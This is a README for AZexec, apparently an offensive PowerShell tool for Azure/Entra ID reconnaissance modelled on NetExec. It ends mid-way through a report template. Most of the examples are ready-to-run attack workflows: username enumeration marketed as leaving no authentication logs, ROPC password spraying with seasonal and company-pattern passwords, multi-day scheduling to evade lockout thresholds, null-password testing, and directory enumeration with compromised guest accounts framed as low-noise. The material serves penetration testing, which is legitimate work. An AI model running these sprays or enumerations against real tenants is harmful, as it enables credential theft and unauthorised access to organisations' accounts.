<p align="center">
  <img src="logo.png" alt="AZexec Logo" width="300"/>
</p>

# AZexec - Azure Execution Tool

**AZX** is a PowerShell-based Azure/Entra ID enumeration tool designed to provide netexec-style output for cloud environments. It offers a familiar command-line interface for security professionals and administrators working with Azure/Entra ID.

[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)

---

> **🔥 SECURITY RESEARCH**: This tool demonstrates the **"Azure Null Session"** vulnerability - guest users can often enumerate entire directories due to misconfigured default permissions. Most organizations are vulnerable. [Read more →](#-guest-user-enumeration---the-azure-null-session)

---

> **⚡ PASSWORD SPRAY ATTACKS**: AZexec provides a complete password spray workflow using Microsoft's own APIs:
> 1. **Phase 1** - `users` command: Stealthy username enumeration via GetCredentialType API (no auth logs!)
> 2. **Phase 2** - `guest` command: ROPC-based credential testing with MFA detection
> 
> This two-phase approach is more effective and safer than traditional spraying - only validated usernames are tested, reducing account lockout risk. [See complete workflow →](#password-spray-attack-examples-getcredentialtype--ropc)

---

## 🔄 NetExec to AZexec Command Mapping

For penetration testers familiar with NetExec (formerly CrackMapExec), here's how the commands translate to Azure:

| NetExec SMB Command | AZexec Equivalent | Authentication | Description |
|---------------------|-------------------|----------------|-------------|
| `nxc smb --enum` | `.\azx.ps1 tenant -Domain example.com` | ❌ None | Enumerate tenant configuration and endpoints |
| `nxc smb --users` | `.\azx.ps1 users -Domain example.com -CommonUsernames` | ❌ None | Enumerate valid usernames |
| `nxc smb --rid-brute` | `.\azx.ps1 user-profiles` | ✅ Required | Enumerate user profiles with details |
| `nxc smb -u 'a' -p ''` | `.\azx.ps1 guest -Domain example.com -Username user -Password ''` | ❌ None | **Test guest/null login** |
| `nxc smb --groups` | `.\azx.ps1 groups` | ✅ Required | Enumerate groups |
| `nxc smb --pass-pol` | `.\azx.ps1 pass-pol` | ✅ Required | Display password policies |
| `nxc smb --qwinsta` | `.\azx.ps1 sessions` | ✅ Required | **Enumerate active sign-in sessions** |
| `nxc smb 10.10.10.161` | `.\azx.ps1 hosts` | ✅ Required | Enumerate devices (hosts) |
| `nxc smb --gen-relay-list` | `.\azx.ps1 vuln-list` | ⚡ Hybrid | **Enumerate vulnerable targets** (relay equivalent) |
| `nxc smb --shares` | *(N/A for Azure)* | - | Azure doesn't have SMB shares |

**Key Difference**: NetExec tests null sessions with `nxc smb -u '' -p ''`. AZexec now has a direct equivalent: `.\azx.ps1 guest -Domain target.com -Username user -Password ''` which tests empty/null password authentication. For post-auth enumeration, use **guest user credentials** which provides similar low-privileged access for reconnaissance. See the [Guest User Enumeration](#-guest-user-enumeration---the-azure-null-session) section for details.

## 🎯 Features

- **Tenant Discovery**: Discover Azure/Entra ID tenant configuration without authentication (mimics `nxc smb --enum`)
  - Enumerate exposed application IDs and redirect URIs
  - Identify misconfigured public clients and OAuth settings
  - Detect implicit flow configurations and security risks
  - Access federation metadata for federated tenants
- **Username Enumeration**: Validate username existence without authentication using GetCredentialType API (mimics `nxc smb --users`)
  - Stealthy username validation (doesn't trigger auth logs)
  - No authentication required - perfect for external reconnaissance
  - Built-in common username lists
  - Export valid usernames for password spray attacks
- **Password Spray Attacks**: ROPC-based credential testing (mimics `nxc smb -u users.txt -p 'Pass123'`)
  - Test single password against multiple users
  - Support for username:password file format
  - Automatic lockout detection and account status reporting
  - MFA detection (valid credentials even if MFA blocks)
  - **Two-phase attack**: First enumerate with GetCredentialType, then spray with ROPC
  - Smart delays to avoid account lockouts
- **User Profile Enumeration**: Enumerate detailed user profiles with authentication (requires User.Read.All)
  - Display names, job titles, departments, and office locations
  - User types (Member vs Guest) and account status
  - Last sign-in activity (if AuditLog.Read.All permission available)
  - Export to CSV or JSON for offline analysis
- **Device Enumeration**: Query and display all devices registered in Azure/Entra ID (mimics `nxc smb --hosts`)
- **Group Enumeration**: Enumerate all Azure AD groups with details (mimics `nxc smb --groups`)
  - Security groups, Microsoft 365 groups, distribution lists
  - Group types, membership counts, and descriptions
  - Dynamic group detection
- **Password Policy Enumeration**: Display password policies and security settings (mimics `nxc smb --pass-pol`)
  - Password expiration policies
  - Authentication methods and MFA settings
  - Security Defaults status
  - Conditional Access policies
- **Guest Login Enumeration**: Test guest/external authentication (mimics `nxc smb -u 'a' -p ''`)
  - Test if tenant accepts external/B2B authentication
  - Test credentials with empty/null passwords (like SMB null session)
  - Password spray with single password against user list
  - Detect MFA requirements, locked accounts, expired passwords
  - ROPC-based authentication testing
- **Guest User Enumeration**: Leverage guest accounts as "Azure null session" for low-noise reconnaissance
  - Exploit default guest permissions for directory enumeration
  - Modern equivalent of SMB null session attacks
  - Test for misconfigured guest access policies
- **Active Session Enumeration**: Query sign-in logs to enumerate active sessions (mimics `nxc smb --qwinsta`)
  - Query Azure AD sign-in audit logs
  - Display recent authentication events and active sessions
  - Show device information, location, IP address, and application used
  - Identify MFA status and risky sign-ins
  - Filter by username and export results
- **Vulnerable Target Enumeration**: Enumerate weak authentication configurations (mimics `nxc smb --gen-relay-list`)
  - Service principals with password-only credentials (like SMB hosts without signing)
  - Applications with public client flows enabled (ROPC vulnerable)
  - Tenants with legacy authentication not blocked
  - Security Defaults and Conditional Access gaps
  - Stale guest accounts and dangerous OAuth permissions
  - **Guest permission level check** (null session equivalent vulnerability)
  - **Users without MFA registered** (credential attack targets)
  - Guest invite policy configuration
  - Hybrid approach: unauthenticated checks + authenticated enumeration
- **Netexec-Style Output**: Familiar output format for penetration testers and security professionals
- **Advanced Filtering**: Filter devices by OS, trust type, compliance status, and more
- **Owner Information**: Optional device owner enumeration with additional API calls
- **Export Capabilities**: Export results to CSV or JSON formats
- **Colored Output**: Color-coded output for better readability (can be disabled)
- **Automatic Authentication**: Handles Microsoft Graph API authentication seamlessly (for authenticated commands)
- **PowerShell 7 Compatible**: Modern PowerShell implementation

## 📚 Additional Documentation

- **[Complete Password Spray Attack Guide](PASSWORD-SPRAY.md)** - Comprehensive documentation for GetCredentialType enumeration + ROPC password spraying
- **[Notes & Roadmap](notes.md)** - Planned features and implementation status

## 📋 Requirements

- **PowerShell 7+** (PowerShell Core)
- **Internet Connection**: Required for API access

### For Device Enumeration (hosts command):
- **Microsoft.Graph PowerShell Module** (automatically installed if missing)
- **Azure/Entra ID Permissions**: 
  - Minimum: `Device.Read.All` scope
  - For owner enumeration: Additional directory read permissions may be required

### For Group Enumeration (groups command):
- **Microsoft.Graph PowerShell Module** (automatically installed if missing)
- **Azure/Entra ID Permissions**:
  - Minimum: `Group.Read.All` or `Directory.Read.All` scope
  - Guest users may have restricted access depending on tenant settings

### For Password Policy Enumeration (pass-pol command):
- **Microsoft.Graph PowerShell Module** (automatically installed if missing)
- **Azure/Entra ID Permissions**:
  - Minimum: `Organization.Read.All` and `Directory.Read.All` scopes
  - For full policy details: `Policy.Read.All` scope recommended
  - Guest users typically cannot view Conditional Access policies

### For Tenant Discovery (tenant command):
- **No authentication required** - Uses public OpenID configuration endpoints

### For Username Enumeration (users command):
- **No authentication required** - Uses public GetCredentialType API endpoint

### For User Profile Enumeration (user-profiles command):
- **Microsoft.Graph PowerShell Module** (automatically installed if missing)
- **Azure/Entra ID Permissions**:
  - Minimum: `User.Read.All` or `Directory.Read.All` scope
  - For sign-in activity: `AuditLog.Read.All` scope (optional but recommended)
  - Guest users may have restricted access depending on tenant settings

### For Guest Login Enumeration (guest command):
- **No authentication required** - Uses public ROPC OAuth2 endpoint
- Tests credentials against Azure/Entra ID authentication endpoints
- Detects MFA requirements, account lockouts, and password expiration

### For Active Session Enumeration (sessions command):
- **Authentication required** - Uses Microsoft Graph API
- **Microsoft.Graph PowerShell Module** (automatically installed if missing)
- **Azure/Entra ID Permissions**:
  - `AuditLog.Read.All` - Query sign-in logs (required)
  - `Directory.Read.All` - Access directory information
- **Note**: Guest users typically cannot access audit logs (expected behavior)
- Queries sign-in logs from the last 24 hours by default

### For Vulnerable Target Enumeration (vuln-list command):
- **Hybrid approach**: Performs unauthenticated checks first, then authenticated enumeration
- **Microsoft.Graph PowerShell Module** (automatically installed if missing)
- **Azure/Entra ID Permissions** (for authenticated phase):
  - `Application.Read.All` - Enumerate service principals and apps
  - `Directory.Read.All` - Enumerate guest users and OAuth grants
  - `Policy.Read.All` - Check Conditional Access, Security Defaults, and guest permission policy
  - `AuditLog.Read.All` - Check user MFA registration status
- **Unauthenticated checks** work without any credentials (tenant config, ROPC status, legacy auth endpoints)

## 🚀 Installation

1. **Clone the repository**:
```bash
git clone https://github.com/Logisek/AZexec.git
cd AZexec
```

2. **Ensure PowerShell 7+ is installed**:
```powershell
$PSVersionTable.PSVersion
```

3. **Run the script** (Microsoft.Graph module will be installed automatically on first run if needed):
```powershell
.\azx.ps1 hosts
```

## 📖 Usage

### Quick Reference: Attack Scenarios

**Scenario 1: External Reconnaissance (No Credentials)**
```powershell
.\azx.ps1 tenant -Domain target.com          # Discover tenant config
.\azx.ps1 users -Domain target.com -CommonUsernames  # Enumerate valid usernames
.\azx.ps1 guest -Domain target.com           # Check if tenant accepts guests
```

**Scenario 1b: Password Spray Attack (Complete Workflow)**
```powershell
# Phase 1: Enumerate valid usernames with GetCredentialType API (no auth, no logs)
.\azx.ps1 users -Domain target.com -CommonUsernames -ExportPath valid-users.csv

# Phase 2: Extract valid usernames for spraying
$validUsers = Import-Csv valid-users.csv | Where-Object { $_.Exists -eq 'True' } | Select-Object -ExpandProperty Username
$validUsers | Out-File -FilePath spray-targets.txt

# Phase 3: Password spray with ROPC authentication
.\azx.ps1 guest -Domain target.com -UserFile spray-targets.txt -Password 'Summer2024!' -ExportPath spray-results.json

# Review results - look for valid credentials, MFA-enabled accounts, and locked accounts
Get-Content spray-results.json | ConvertFrom-Json | Select -ExpandProperty AuthResults | Where-Object { $_.Success -eq $true }
```

**Scenario 1c: Quick Null Password Testing (Like nxc smb -u 'a' -p '')**
```powershell
.\azx.ps1 guest                                                    # Check current tenant (auto-detect)
.\azx.ps1 guest -Domain target.com -Username user -Password ''     # Test null password
.\azx.ps1 guest -UserFile users.txt -Password 'Summer2024!'        # Password spray (auto-detect domain)
```

**Scenario 2: Guest User Enumeration (Low-Privilege Access)**
```powershell
# The "Azure Null Session" - most powerful low-noise technique
.\azx.ps1 hosts                              # Login with guest credentials
.\azx.ps1 user-profiles -ExportPath users.csv  # Enumerate user profiles
.\azx.ps1 groups                             # Enumerate groups
.\azx.ps1 hosts -ShowOwners -ExportPath enum.json  # Full enumeration
```

**Scenario 3: Member Account Enumeration (Full Access)**
```powershell
.\azx.ps1 hosts -Scopes "User.Read.All,Device.Read.All,Group.Read.All"
.\azx.ps1 hosts -Filter noncompliant         # Find weak security posture
.\azx.ps1 pass-pol                           # Check password policies
```

**Scenario 4: Vulnerability Assessment (Like nxc smb --gen-relay-list)**
```powershell
# The Azure equivalent of finding SMB hosts without signing
.\azx.ps1 vuln-list                          # Full vuln assessment (domain auto-detected)
.\azx.ps1 vuln-list -Domain target.com       # Target specific tenant
.\azx.ps1 vuln-list -ExportPath relay.txt    # Export HIGH risk targets (relay-list style)
.\azx.ps1 vuln-list -ExportPath full.json    # Export all findings as JSON
```

**Scenario 5: Active Session Monitoring (Like nxc smb --qwinsta)**
```powershell
# Enumerate active sign-in sessions - the cloud equivalent of qwinsta
.\azx.ps1 sessions                           # Last 24 hours (default)
.\azx.ps1 sessions -Hours 168                # Last 7 days
.\azx.ps1 sessions -Username alice@corp.com  # Track specific user
.\azx.ps1 sessions -Hours 1                  # Real-time monitoring (last hour)
.\azx.ps1 sessions -Hours 720 -ExportPath audit.csv  # 30-day audit (requires Premium)
```

### Basic Syntax

```powershell
# Device enumeration
.\azx.ps1 hosts [-Filter <FilterType>] [-ShowOwners] [-NoColor] [-ExportPath <Path>] [-Scopes <Scopes>]

# Tenant discovery (auto-detects domain if not specified)
.\azx.ps1 tenant [-Domain <DomainName>] [-NoColor] [-ExportPath <Path>]

# Username enumeration (no authentication required, auto-detects domain if not specified)
.\azx.ps1 users [-Domain <DomainName>] [-Username <User>] [-UserFile <Path>] [-CommonUsernames] [-NoColor] [-ExportPath <Path>]

# User profile enumeration (authentication required)
.\azx.ps1 user-profiles [-NoColor] [-ExportPath <Path>]

# Group enumeration (authentication required)
.\azx.ps1 groups [-ShowOwners] [-NoColor] [-ExportPath <Path>]

# Password policy enumeration (authentication required)
.\azx.ps1 pass-pol [-NoColor] [-ExportPath <Path>]

# Guest login enumeration (like nxc smb -u 'a' -p '') - domain auto-detected if not specified
.\azx.ps1 guest [-Domain <DomainName>] [-Username <User>] [-Password <Password>] [-UserFile <Path>] [-NoColor] [-ExportPath <Path>]

# Active session enumeration (like nxc smb --qwinsta) - authentication required
.\azx.ps1 sessions [-Username <User>] [-Hours <Hours>] [-NoColor] [-ExportPath <Path>]

# Vulnerable target enumeration (like nxc smb --gen-relay-list) - domain auto-detected if not specified
.\azx.ps1 vuln-list [-Domain <DomainName>] [-NoColor] [-ExportPath <Path>]
```

### Parameters

| Parameter | Description | Required | Default |
|-----------|-------------|----------|---------|
| `Command` | Operation to perform: `hosts`, `tenant`, `users`, `user-profiles`, `groups`, `pass-pol`, `guest`, `vuln-list`, `sessions` | Yes | - |
| `Domain` | Domain name for tenant/user/guest discovery. Auto-detected from UPN, username, or environment if not provided | No | Auto-detect |
| `Filter` | Filter devices by criteria | No | `all` |
| `ShowOwners` | Display device/group owners (slower) | No | `False` |
| `Username` | Single username to check (users/guest/sessions commands) | No | - |
| `Password` | Password to test for authentication (guest command). Use `''` for null password | No | - |
| `UserFile` | File with usernames to check (users/guest commands) | No | - |
| `CommonUsernames` | Use built-in common username list (users command) | No | `False` |
| `Hours` | Number of hours to look back for sign-in events (sessions command). Azure AD retention: 7 days (Free), 30 days (Premium) | No | `24` |
| `NoColor` | Disable colored output | No | `False` |
| `ExportPath` | Export results to CSV or JSON | No | - |
| `Scopes` | Microsoft Graph scopes to request (automatically set based on command) | No | Command-specific |

### Available Filters

- `all` - All devices (default)
- `windows` - Only Windows devices
- `azuread` - Only Azure AD joined devices
- `hybrid` - Only Hybrid Azure AD joined devices
- `compliant` - Only compliant devices
- `noncompliant` - Only non-compliant devices
- `disabled` - Only disabled devices

## 💡 Usage Examples

### Username Enumeration Examples

### Example 1: Check Single Username (Auto-Detect Domain)
Check if a username exists using auto-detected domain:
```powershell
.\azx.ps1 users -Username alice@example.com
```

### Example 2: Check Single Username
Check if a specific username exists in the tenant:
```powershell
.\azx.ps1 users -Domain example.com -Username alice@example.com
```

### Example 3: Check Username Without Domain Suffix
Check a username (domain will be auto-appended):
```powershell
.\azx.ps1 users -Domain example.com -Username alice
```

### Example 4: Check Usernames from File
Check multiple usernames from a file (one per line):
```powershell
.\azx.ps1 users -Domain example.com -UserFile users.txt
```

### Example 5: Check Common Usernames
Test common usernames against the tenant:
```powershell
.\azx.ps1 users -Domain example.com -CommonUsernames
```

### Example 6: Check Common Usernames (Auto-Detect Domain)
Test common usernames against your current tenant (domain auto-detected):
```powershell
.\azx.ps1 users -CommonUsernames
```

### Example 7: Export Valid Usernames
Check common usernames and export valid ones:
```powershell
.\azx.ps1 users -Domain example.com -CommonUsernames -ExportPath valid-users.csv
```

### Example 8: Multiple Methods Combined
Check a specific user plus common usernames:
```powershell
.\azx.ps1 users -Domain example.com -Username admin@example.com -CommonUsernames -ExportPath results.json
```

### User Profile Enumeration Examples

### Example 8a: Basic User Profile Enumeration
Enumerate all user profiles in the Azure/Entra tenant (authenticated):
```powershell
.\azx.ps1 user-profiles
```

### Example 8b: User Profile Enumeration with CSV Export
Enumerate all user profiles and export to CSV:
```powershell
.\azx.ps1 user-profiles -ExportPath users.csv
```

### Example 8c: User Profile Enumeration with JSON Export
Enumerate all user profiles and export to JSON with full details:
```powershell
.\azx.ps1 user-profiles -ExportPath users.json
```

### Example 8d: User Profile Enumeration as Guest User
Test what user profiles a guest user can enumerate:
```powershell
# Connect as guest user first
.\azx.ps1 user-profiles -ExportPath guest-users.json
```

### Example 8e: Complete Directory Enumeration
Enumerate users, groups, devices, and policies:
```powershell
.\azx.ps1 user-profiles -ExportPath users.csv
.\azx.ps1 groups -ExportPath groups.csv
.\azx.ps1 hosts -ExportPath devices.csv
.\azx.ps1 pass-pol -ExportPath policy.json
```

### Tenant Discovery Examples

### Example 9: Auto-Detect Current User's Domain
Discover tenant configuration for your current domain (auto-detected):
```powershell
.\azx.ps1 tenant
```

### Example 10: Basic Tenant Discovery
Discover tenant configuration for a specific domain:
```powershell
.\azx.ps1 tenant -Domain example.com
```

### Example 11: Tenant Discovery with Export
Discover tenant configuration and export to JSON:
```powershell
.\azx.ps1 tenant -Domain contoso.onmicrosoft.com -ExportPath tenant-info.json
```

### Example 12: Tenant Discovery for Multiple Domains
Discover configuration for multiple domains:
```powershell
@("example.com", "contoso.com", "fabrikam.onmicrosoft.com") | ForEach-Object { 
    .\azx.ps1 tenant -Domain $_ 
}
```

### Example 12a: Enhanced Tenant Enumeration (like `nxc smb --enum`)
Perform comprehensive tenant reconnaissance including exposed apps and misconfigurations:
```powershell
.\azx.ps1 tenant -Domain example.com -ExportPath tenant-security-findings.json
```
This will enumerate:
- Exposed application IDs and client configurations
- Publicly accessible redirect URIs
- OAuth/OIDC misconfigurations (implicit flow, risky grant types)
- Federation metadata and endpoints
- Accessible Graph and Azure Management endpoints

### Device Enumeration Examples

### Example 13: Basic Device Enumeration
Enumerate all devices in the Azure/Entra tenant:
```powershell
.\azx.ps1 hosts
```

### Example 14: Filter Windows Devices
Enumerate only Windows devices:
```powershell
.\azx.ps1 hosts -Filter windows
```

### Example 15: Azure AD Joined Devices with Owners
Enumerate Azure AD joined devices and display their registered owners:
```powershell
.\azx.ps1 hosts -Filter azuread -ShowOwners
```

### Example 16: Non-Compliant Devices with Export
Enumerate non-compliant devices and export results to CSV:
```powershell
.\azx.ps1 hosts -Filter noncompliant -ExportPath devices.csv
```

### Example 17: Export to JSON
Enumerate all devices and export to JSON format:
```powershell
.\azx.ps1 hosts -ExportPath results.json
```

### Example 18: Disable Colored Output
Enumerate devices without colored output (useful for logging):
```powershell
.\azx.ps1 hosts -NoColor
```

### Example 19: Hybrid Joined Devices Only
Enumerate only Hybrid Azure AD joined devices:
```powershell
.\azx.ps1 hosts -Filter hybrid
```

### Example 20: Disabled Devices
Find all disabled devices in the tenant:
```powershell
.\azx.ps1 hosts -Filter disabled
```

### Example 21: Compliant Windows Devices with Export
Enumerate compliant Windows devices and export:
```powershell
.\azx.ps1 hosts -Filter compliant | Where-Object { $_.OperatingSystem -like "Windows*" }
```
*Note: For complex filtering, combine with PowerShell pipeline*

### Example 22: Custom Scopes
Specify custom Microsoft Graph scopes:
```powershell
.\azx.ps1 hosts -Scopes "Device.Read.All,Directory.Read.All"
```

### Guest User Enumeration Examples (Azure Null Session)

### Example 23: Test for Guest Enumeration Vulnerability
First, check if the target organization has external collaboration enabled:
```powershell
# Reconnaissance (no authentication)
.\azx.ps1 tenant -Domain targetcorp.com
```

### Example 24: Enumerate as Guest User (Low-Noise Reconnaissance)
Using compromised or legitimate guest credentials:
```powershell
# Disconnect any existing sessions
Disconnect-MgGraph

# Connect with guest credentials
.\azx.ps1 hosts
# (Enter guest credentials when prompted: vendor@partner.com)
```

### Example 25: Full Guest Enumeration with Export
Perform comprehensive enumeration as a guest user:
```powershell
# Full device enumeration with owners
.\azx.ps1 hosts -ShowOwners -ExportPath guest-devices.json

# Export to analyze offline
# Low-noise reconnaissance - guest activity is rarely monitored
```

### Example 26: Guest User Capability Testing
Test what a guest account can access:
```powershell
# After connecting as guest with .\azx.ps1 hosts

# Try built-in commands (easier and netexec-style output)
.\azx.ps1 groups -ExportPath guest-groups.csv
.\azx.ps1 pass-pol -ExportPath guest-policy.json

# Or use PowerShell Graph API directly
Get-MgUser -All | Select DisplayName, UserPrincipalName, JobTitle, Department | Export-Csv guest-users.csv
Get-MgGroup -All | Select DisplayName, Description | Export-Csv guest-groups.csv
Get-MgApplication -All | Select DisplayName, AppId | Export-Csv guest-apps.csv
```

### Example 27: Compare Guest vs Member Permissions
Enumerate with both account types to identify permission differences:
```powershell
# As guest user
.\azx.ps1 hosts -ExportPath guest-enum.json

# Disconnect and connect as member user
Disconnect-MgGraph
.\azx.ps1 hosts -ExportPath member-enum.json

# Compare results to understand guest restrictions (if any)
```

### Group Enumeration Examples

### Example 28a: Basic Group Enumeration (mimics `nxc smb --groups`)
Enumerate all groups in the Azure/Entra tenant:
```powershell
.\azx.ps1 groups
```

### Example 28b: Group Enumeration with Export
Enumerate all groups and export to CSV:
```powershell
.\azx.ps1 groups -ExportPath groups.csv
```

### Example 28c: Group Enumeration with Member Counts
Enumerate groups and display member counts (slower):
```powershell
.\azx.ps1 groups -ShowOwners
```

### Example 28d: Group Enumeration as Guest User
Test what groups a guest user can enumerate:
```powershell
# Connect as guest user
.\azx.ps1 groups -ExportPath guest-groups.json
```

### Password Policy Enumeration Examples

### Example 28e: Password Policy Enumeration (mimics `nxc smb --pass-pol`)
Display password policies and security settings:
```powershell
.\azx.ps1 pass-pol
```

### Example 28f: Password Policy with Export
Export password policy information to JSON:
```powershell
.\azx.ps1 pass-pol -ExportPath policy.json
```

### Example 28g: Complete Security Assessment
Enumerate all security-relevant information:
```powershell
.\azx.ps1 hosts -ExportPath devices.csv
.\azx.ps1 groups -ExportPath groups.csv
.\azx.ps1 pass-pol -ExportPath policy.json
```

### Guest Login Enumeration Examples (like nxc smb -u 'a' -p '')

### Example 28h: Check Tenant Guest Configuration (Unauthenticated)
Check if a tenant accepts external/guest authentication:
```powershell
.\azx.ps1 guest -Domain targetcorp.com
```

### Example 28h2: Check Guest Configuration (Auto-Detect Domain)
Check guest configuration for your current tenant (domain auto-detected):
```powershell
.\azx.ps1 guest
```

### Example 28i: Test Null/Empty Password (like nxc smb -u 'a' -p '')
Test if accounts accept empty passwords:
```powershell
.\azx.ps1 guest -Domain targetcorp.com -Username admin -Password ''
.\azx.ps1 guest -Domain targetcorp.com -Username admin@targetcorp.com -Password ''
```

### Example 28j: Test Specific Credentials
Test a specific username/password combination:
```powershell
.\azx.ps1 guest -Domain targetcorp.com -Username alice@targetcorp.com -Password 'Summer2024!'
```

### Example 28k: Password Spray (Single Password, Multiple Users)
Test one password against multiple usernames:
```powershell
.\azx.ps1 guest -Domain targetcorp.com -UserFile users.txt -Password 'Winter2024!'
```

### Example 28l: Credential Testing from File
Test credentials from a file (format: `username:password` per line):
```powershell
.\azx.ps1 guest -Domain targetcorp.com -UserFile creds.txt
```

File format example (creds.txt):
```
admin:Password123
alice:Summer2024!
bob@targetcorp.com:Winter2024!
```

### Example 28m: Export Guest Login Results
Test credentials and export results:
```powershell
.\azx.ps1 guest -Domain targetcorp.com -UserFile users.txt -Password 'Password123' -ExportPath spray-results.json
```

### Password Spray Attack Examples (GetCredentialType + ROPC)

The most effective password spray attacks combine **username enumeration** with **credential testing** in a two-phase approach:

### Example 28n: Complete Password Spray - Common Usernames
Full workflow using common administrator accounts:
```powershell
# Phase 1: Enumerate valid usernames (GetCredentialType - no authentication logs)
.\azx.ps1 users -Domain targetcorp.com -CommonUsernames -ExportPath valid-users.csv

# Phase 2: Extract valid usernames
$validUsers = Import-Csv valid-users.csv | Where-Object { $_.Exists -eq 'True' } | Select-Object -ExpandProperty Username
$validUsers | Out-File -FilePath spray-targets.txt
Write-Host "Found $($validUsers.Count) valid usernames for spraying"

# Phase 3: Password spray with seasonal password
.\azx.ps1 guest -Domain targetcorp.com -UserFile spray-targets.txt -Password 'Summer2024!' -ExportPath spray-results.json

# Phase 4: Analyze results
$results = Get-Content spray-results.json | ConvertFrom-Json
$validCreds = $results.AuthResults | Where-Object { $_.Success -eq $true }
$mfaAccounts = $results.AuthResults | Where-Object { $_.MFARequired -eq $true }

Write-Host "`nValid Credentials Found: $($validCreds.Count)"
Write-Host "Accounts with MFA: $($mfaAccounts.Count)"
$validCreds | Format-Table Username, MFARequired, HasToken
```

### Example 28o: Targeted Password Spray - Custom Username List
Using a custom list of identified users:
```powershell
# Assume you've collected usernames from OSINT, LinkedIn, company website, etc.
# Create a file: executives.txt with usernames (one per line)

# Phase 1: Validate which usernames actually exist
.\azx.ps1 users -Domain targetcorp.com -UserFile executives.txt -ExportPath validated-execs.csv

# Phase 2: Spray only against valid accounts
$validExecs = Import-Csv validated-execs.csv | Where-Object { $_.Exists -eq 'True' } | Select-Object -ExpandProperty Username
$validExecs | Out-File -FilePath valid-executives.txt

# Phase 3: Test with company-specific password pattern
.\azx.ps1 guest -Domain targetcorp.com -UserFile valid-executives.txt -Password 'TargetCorp2024!' -ExportPath exec-spray.json
```

### Example 28p: Multi-Password Spray Campaign
Testing multiple passwords sequentially (with delays to avoid lockouts):
```powershell
# Validate usernames first
.\azx.ps1 users -Domain targetcorp.com -CommonUsernames -ExportPath valid-users.csv
$validUsers = Import-Csv valid-users.csv | Where-Object { $_.Exists -eq 'True' } | Select-Object -ExpandProperty Username
$validUsers | Out-File spray-targets.txt

# Password list (seasonal passwords + common patterns)
$passwords = @(
    'Summer2024!',
    'Winter2024!',
    'Spring2024!',
    'Fall2024!',
    'Password123!',
    'Welcome123!',
    'TargetCorp2024!'
)

# Spray each password with 30-minute delay between rounds
foreach ($password in $passwords) {
    Write-Host "`n[*] Testing password: $password"
    .\azx.ps1 guest -Domain targetcorp.com -UserFile spray-targets.txt -Password $password -ExportPath "spray-$password.json"
    
    # Wait 30 minutes before next password (avoid account lockouts)
    if ($password -ne $passwords[-1]) {
        Write-Host "[*] Waiting 30 minutes before next password spray..."
        Start-Sleep -Seconds 1800  # 30 minutes
    }
}

# Consolidate all results
$allResults = @()
foreach ($password in $passwords) {
    $result = Get-Content "spray-$password.json" | ConvertFrom-Json
    $validCreds = $result.AuthResults | Where-Object { $_.Success -eq $true }
    $allResults += $validCreds
}

Write-Host "`n[+] Total valid credentials found: $($allResults.Count)"
$allResults | Format-Table Username, Password, MFARequired, HasToken
```

### Example 28q: Smart Password Spray - Avoid Known Lockout Thresholds
Intelligent spraying that respects common lockout policies:
```powershell
# Most organizations lock accounts after 5-10 failed attempts
# Spray only 1 password per day to stay under threshold

# Day 1: Validate usernames
.\azx.ps1 users -Domain targetcorp.com -CommonUsernames -ExportPath valid-users.csv
$validUsers = Import-Csv valid-users.csv | Where-Object { $_.Exists -eq 'True' } | Select-Object -ExpandProperty Username
$validUsers | Out-File spray-targets.txt

# Day 1: Test most common password
.\azx.ps1 guest -Domain targetcorp.com -UserFile spray-targets.txt -Password 'Summer2024!' -ExportPath spray-day1.json

# Day 2: Test second most common (24 hours later)
.\azx.ps1 guest -Domain targetcorp.com -UserFile spray-targets.txt -Password 'Winter2024!' -ExportPath spray-day2.json

# Day 3: Test company-specific pattern
.\azx.ps1 guest -Domain targetcorp.com -UserFile spray-targets.txt -Password 'TargetCorp2024!' -ExportPath spray-day3.json

# Analyze results after campaign
$day1 = Get-Content spray-day1.json | ConvertFrom-Json
$day2 = Get-Content spray-day2.json | ConvertFrom-Json
$day3 = Get-Content spray-day3.json | ConvertFrom-Json

$allValidCreds = @()
$allValidCreds += $day1.AuthResults | Where-Object { $_.Success }
$allValidCreds += $day2.AuthResults | Where-Object { $_.Success }
$allValidCreds += $day3.AuthResults | Where-Object { $_.Success }

Write-Host "[+] Campaign complete - Valid credentials: $($allValidCreds.Count)"
$allValidCreds | Export-Csv campaign-results.csv -NoTypeInformation
```

### Example 28r: Password Spray with Username:Password Format
Testing specific username/password combinations:
```powershell
# Create a file (creds.txt) with format: username:password
# admin:Password123
# alice:Summer2024!
# bob@targetcorp.com:Welcome2024!

# Test all credentials at once
.\azx.ps1 guest -Domain targetcorp.com -UserFile creds.txt -ExportPath cred-test-results.json

# Analyze what worked
$results = Get-Content cred-test-results.json | ConvertFrom-Json
$validCreds = $results.AuthResults | Where-Object { $_.Success -eq $true }
$mfaRequired = $validCreds | Where-Object { $_.MFARequired -eq $true }
$fullAccess = $validCreds | Where-Object { $_.HasToken -eq $true }

Write-Host "`nValid Credentials: $($validCreds.Count)"
Write-Host "Full Access (no MFA): $($fullAccess.Count)"
Write-Host "MFA Required: $($mfaRequired.Count)"
```

### Example 28s: Automated Password Spray Analysis
Complete workflow with result analysis and reporting:
```powershell
# Comprehensive password spray with analysis
$domain = "targetcorp.com"
$password = "Summer2024!"

# Step 1: Username enumeration
Write-Host "[*] Phase 1: Enumerating valid usernames..."
.\azx.ps1 users -Domain $domain -CommonUsernames -ExportPath users-enum.csv

# Step 2: Extract valid usernames
$validUsers = Import-Csv users-enum.csv | Where-Object { $_.Exists -eq 'True' }
Write-Host "[+] Found $($validUsers.Count) valid usernames"
$validUsers.Username | Out-File spray-targets.txt

# Step 3: Password spray
Write-Host "[*] Phase 2: Password spraying..."
.\azx.ps1 guest -Domain $domain -UserFile spray-targets.txt -Password $password -ExportPath spray-results.json

# Step 4: Analyze results
$results = Get-Content spray-results.json | ConvertFrom-Json

$validCreds = $results.AuthResults | Where-Object { $_.Success -eq $true }
$invalidCreds = $results.AuthResults | Where-Object { $_.Success -eq $false }
$mfaRequired = $results.AuthResults | Where-Object { $_.MFARequired -eq $true }
$lockedAccounts = $results.AuthResults | Where-Object { $_.ErrorCode -eq 'ACCOUNT_LOCKED' }

# Step 5: Generate report
$report = @"

=================================================
   PASSWORD SPRAY ATTACK REPORT
=================================================
Target Domain:        $domain
Test Password:        $password
Date:                 $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")

RESULTS SUMMARY
-------------------------------------------------
Total Usernames Tested:     $($results.AuthResults.Count)
Valid Credentials Found:    $($validCreds.Count)
  - Full Access (no MFA):   $($validCreds.Count - $mfaRequired.Count)
  - MFA Required:           $($mfaRequired.Count)
Invalid Credentials:        $($invalidCreds.Count)
